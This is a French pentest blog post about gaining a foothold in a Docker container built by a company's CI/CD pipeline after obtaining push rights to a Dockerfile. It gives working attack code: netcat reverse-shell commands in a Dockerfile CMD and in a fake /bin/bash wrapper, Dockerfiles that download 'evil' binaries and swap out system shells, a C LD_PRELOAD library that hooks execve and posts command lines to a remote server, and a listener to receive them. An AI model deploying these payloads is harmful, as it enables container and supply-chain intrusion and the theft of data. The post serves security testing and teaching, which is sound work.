---
title: "LDPreloading inside a Docker container"
date: "2025-11-15"
description: "Lors d'une mission récente, j'ai dû trouver un moyen d'obtenir un shell dans un container Docker. Cela a mené à l'utilisation astucieuse de LD_PRELOAD"
categories:
  - "containers"
  - "cicd"
  - "devops"
  - "pentest"
image: "/medias/articles/ldpreload-docker/image.jpg"
---

Lors d'une mission récente, j'ai dû trouver un moyen d'obtenir un shell dans un container Docker. Ici, pas question d'un simple "CMD reverseshell".

### Environnement de tests

Le scénario de tests est important, dans ce cas-ci, l'accès initial est un compte Github disposant d'un droit de push sur un fichier Dockerfile. Un ensemble de Github Actions sont ensuite lancées afin de créer une image depuis notre Dockerfile, la publier sur un repository interne à l'entreprise et enfin lancer le container.

Aucune information supplémentaire n'est donnée, je ne connais pas l'environnement d'exécution et, je n'ai pas plus d'informations sur la CI/CD mise en place.

### Premiers tests

Habituellement, lorsqu'il s'agit de tester un environnement Docker la première idée est de démarrer un container offrant un reverse shell.

Ainsi, ma première intuition fut de lancer ce type d'image :

```docker
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    bash \
    gcc \
    wget \
    build-essential \
    netcat-traditional

CMD ["nc","-e","/bin/bash","REMOTESRV","REMOTEPORT"]
```

Cependant, je n'obtenais jamais de retours.

### Causes & conséquences

Pour comprendre l'échec de cette simple image, il faut comprendre comment fonctionne le lancement d'une image via Docker.

Une image est constituée d'un ensemble de couches, elles-mêmes représentant une où plusieurs commandes lancées pour créer l'image. Cependant, les commandes de type `RUN` ne sont éxecutées qu'une fois et prennent fin une fois la couche produite. Il n'est pas envisageable d'écrire `RUN nc -e /bin/bash ...` en espérant que cette commande se lance lors de l'instanciation de l'image.

Pour lancer des commandes au démarrage du container, il existe deux verbes : `CMD` et `ENTRYPOINT`.
En théorie, `ENTRYPOINT` doit contenir le programme principal à lancer à la création du container et `CMD` les arguments.
En pratique cette règle n'est pas souvent respectée et certains développeurs (dont moi) utilisent uniquement l'un ou l'autre sans raison apparente.
Avec le temps, j'avais pris l'habitude de renseigner `CMD` car celle-ci peut être surchargée plus simplement via la commande `docker run` (`ENTRYPOINT` peut être surchargée aussi, mais l'argument est moins trivial).

C'est cette mauvaise habitude qui m'a fait comprendre quel était le point bloquant. Ma commande est surement surchargée.

De plus, les orchestrateurs comme Kubernetes permettent aussi de surcharger une commande de lancement via les arguments `cmd` et `args`.

De nombreuses raisons qui pourraient expliquer que ma commande ne s'exécute pas.

Mais comment en être certain ?

Ma première idée était de trouver une technique pour lire `/proc/1/cmdline` ce fichier contenant la commande du processus principal du container. Pour y arriver j'ai d'abord pensé à une `crontab` cependant comme chaque utilisateur de Docker le sait, ce mécanisme n'est pas le plus fiable dans un container. De plus, les exemples que j'ai pu voir sur internet lançaient le processus `crontab` via `CMD` ou `ENTRYPOINT`.

La seconde, était de créer un _Fakebin_ remplaçant `/bin/bash` ou `/bin/sh`.

Le code suivant pourrait fonctionner :

```bash
#!/bin/bash
REMOTE="SERVER"
PORT="80"
curl http://$REMOTE/ping
nc -e /bin/bash $REMOTE $PORT
curl http://$REMOTE/pong
```

Avec un `Dockerfile` comme ceci :

```Dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    bash \
    gcc \
    wget \
    build-essential \
    netcat-traditional

RUN wget https://raw.githubusercontent.com/shoxxdj/Container-Evil-Ressources/refs/heads/main/FAKEBIN/evil-bash -O /bin/evil-bash

RUN chmod +x /bin/evil-bash
RUN mv /bin/bash /bin/bash.real
RUN mv /bin/evil-bash /bin/bash

```

Cependant, bien que cette technique puisse fonctionner, le nombre de binaires à remplacer est conséquent meme dans une image minimale.
De plus, rien ne m'indique que le container ne lance pas un programme personnalisé (difficile de deviner `CMD ['/opt/random/random2/hello/binary']`)

Chou blanc.

### Les processus Linux

Un container c'est vulgairement, un Linux minimal exécuté dans un environnement restreint.

Les règles des processus Linux s'appliquent au sein du container.

Il est alors possible de raisonner autrement pour résoudre le problème :

_Comment connaitre le `CMD` ou `ENTRYPOINT`_

Deviens :

_Comment savoir quel programme est lancé sur une machine Linux avant même qu'il soit executé_

Sur un système d'exploitation Linux, (et globalement de nombreux systèmes modernes) les programmes n'embarquent pas toutes les fonctions dont ils ont besoins. Ceci par soucis de taille. Cela se vérifie en ajoutant la commande `-static` lors de la compilation avec `gcc`.

La contrainte principale de ce mécanisme est qu'il force l'utilisateur à posséder la fonction attendue. Celles-ci sont référencées dans des librairies. Il faut alors un mécanisme pour faire le lient entre la fonction demandée par le programme et son emplacement sur le système. C'est le rôle du _Dynamic Linker_.

```bash
man ld.so
[...]
DESCRIPTION
       The programs ld.so and ld-linux.so* find and load the shared objects (shared libraries) needed by a program, prepare the program to run, and then run it.

       Linux binaries require dynamic linking (linking at run time) unless the -static option was given to ld(1) during compilation.
```

Ce mécanisme fonctionne à l'aide de variables d'environnements et l'une d'entre elles est particulièrement utile `LD_PRELOAD`.

```bash
man ld.so
[...]
LD_PRELOAD
    A list of additional, user-specified, ELF shared objects to be loaded before all others.  This feature can be used to selectively override functions in other shared objects.
```

Celle-ci va me permettre de charger une librairie de mon choix avant même que le programme soit lancée. Le plus intéressant ici, est que la librairie connaitra le contexte d'exécution du programme (car le _Dynamic Linker_ le connait).

Le point le plus intéressant et que dans un Dockerfile, il est possible de définir des variables d'environnement `ENV` et que celles-ci ne dépendent pas de la commande lancée.

La contrainte est ici de créer une librairie, un script `bash` ne suffirait pas.

### Librairie

L'idée est maintenant de créer une librairie permettant de connaitre la ligne de commande lançant le processus. Et d'envoyer cette fameuse ligne de commande sur un serveur distant.

Autre contrainte, par défaut une librairie ça n'éxecute pas directement de code. Heureusement de nombreuses techniques permettent de contourner ce problème.

Le code de la librairie est le suivant :

```c
// exec_hook.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

// Variable pour éviter la récursion
static __thread int in_hook = 0;

void send_exec_info(const char *filename, char *const argv[]) {
    // Protection contre la récursion
    if (in_hook) return;
    in_hook = 1;

    // Ne pas logger certaines commandes système critiques
    if (strstr(filename, "ldconfig") ||
        strstr(filename, "ld-linux") ||
        strstr(filename, "ld.so")) {
        in_hook = 0;
        return;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);

        inet_pton(AF_INET, "SERVER", &server.sin_addr);

        // Timeout court
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            char args[2048] = "";
            int i = 0;
            while (argv && argv[i] != NULL && strlen(args) < 1800) {
                if (i > 0) strcat(args, " ");
                strcat(args, argv[i]);
                i++;
            }

            char body[3096];
            char hostname[256];
            gethostname(hostname, sizeof(hostname));

            snprintf(body, sizeof(body),
                "{\"filename\":\"%s\",\"args\":\"%s\",\"hostname\":\"%s\",\"pid\":%d}",
                filename, args, hostname, getpid());

            char http_request[4096];
            snprintf(http_request, sizeof(http_request),
                "POST /api/exec HTTP/1.1\r\n"
                "Host: monitor\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: %ld\r\n"
                "Connection: close\r\n"
                "\r\n"
                "%s",
                strlen(body), body);

            send(sock, http_request, strlen(http_request), MSG_NOSIGNAL);
        }
        close(sock);
    }

    in_hook = 0;
}

int execve(const char *filename, char *const argv[], char *const envp[]) {
    send_exec_info(filename, argv);

    // Obtenir le vrai execve
    static int (*real_execve)(const char*, char *const[], char *const[]) = NULL;
    if (!real_execve) {
        real_execve = dlsym(RTLD_NEXT, "execve");
        if (!real_execve) {
            fprintf(stderr, "Failed to find real execve\n");
            return -1;
        }
    }

    return real_execve(filename, argv, envp);
}

int execv(const char *filename, char *const argv[]) {
    send_exec_info(filename, argv);

    static int (*real_execv)(const char*, char *const[]) = NULL;
    if (!real_execv) {
        real_execv = dlsym(RTLD_NEXT, "execv");
    }
    return real_execv ? real_execv(filename, argv) : -1;
}

int execvp(const char *filename, char *const argv[]) {
    send_exec_info(filename, argv);

    static int (*real_execvp)(const char*, char *const[]) = NULL;
    if (!real_execvp) {
        real_execvp = dlsym(RTLD_NEXT, "execvp");
    }
    return real_execvp ? real_execvp(filename, argv) : -1;
}

int execvpe(const char *filename, char *const argv[], char *const envp[]) {
    send_exec_info(filename, argv);

    static int (*real_execvpe)(const char*, char *const[], char *const[]) = NULL;
    if (!real_execvpe) {
        real_execvpe = dlsym(RTLD_NEXT, "execvpe");
    }
    return real_execvpe ? real_execvpe(filename, argv, envp) : -1;
}
```

Il s'agit du code final utilisé lors de l'attaque. Celui-ci est certainement améliorable, vous pouvez proposer une pull request sur le [repository github dédié](https://github.com/shoxxdj/Container-Evil-Ressources/blob/main/LD_PRELOAD_CONTAINER/exec_hook.c).

Après avoir remplacé la chaine de caractère "SERVER" celle-ci se compile de la manière suivante :

```bash
gcc -shared -fPIC exec_hook.c -o exec_hook.so -ldl -pthread
```

### Payload

A présent, je peux écrire un `Dockerfile` qui résume les étapes précédentes :

```Dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    bash \
    gcc \
    wget \
    build-essential

RUN wget https://raw.githubusercontent.com/shoxxdj/Container-Evil-Ressources/refs/heads/main/LD_PRELOAD_CONTAINER/exec_hook.c -O exec_hook.c
RUN gcc -shared -fPIC exec_hook.c -o exec_hook.so -ldl -pthread
RUN mv exec_hook.so /lib/exec_hook.so

ENV LD_PRELOAD=/lib/exec_hook.so
```

Un rapide serveur me permet ensuite de récupérer la commande lancée :

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class ExecHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/api/exec':
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)

            try:
                data = json.loads(body)
                timestamp = datetime.now().isoformat()
                print(f"[{timestamp}] EXEC captured:")
                print(f"  Filename: {data.get('filename')}")
                print(f"  Args: {data.get('args')}")
                print(f"  Hostname: {data.get('hostname')}")
                print(f"  PID: {data.get('pid')}")
                print("-" * 60)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                print(f"Error: {e}")
                self.send_response(500)
                self.end_headers()

    def log_message(self, format, *args):
        pass  # Désactiver les logs HTTP standards

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), ExecHandler)
    print("Listening on port 80...")
    server.serve_forever()
```

And voilà ! Une fois le container lancé, je reçois la commande.
Ceci permet de connaitre le binaire lancé, dans mon cas, il s'agissait bien d'un binaire propre à l'entreprise située dans un répertoire spécifique, le _fakebin_ n'aurait pas pu fonctionner.

Cette technique fonctionne pour un lancement d'une image `Docker` "en direct" et via `Kubernetes`.

### Références

Les extraits de code (librairie, serveur et Dockerfile) sont partagés sur ce repository :

- [https://github.com/shoxxdj/Container-Evil-Ressources](https://github.com/shoxxdj/Container-Evil-Ressources)

La documentation de ld.so :

- [https://man7.org/linux/man-pages/man8/ld.so.8.html](https://man7.org/linux/man-pages/man8/ld.so.8.html)

Un article sur LDPReload :

- [https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Quelques%20astuces%20avec%20LD_PRELOAD.pdf](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Quelques%20astuces%20avec%20LD_PRELOAD.pdf)
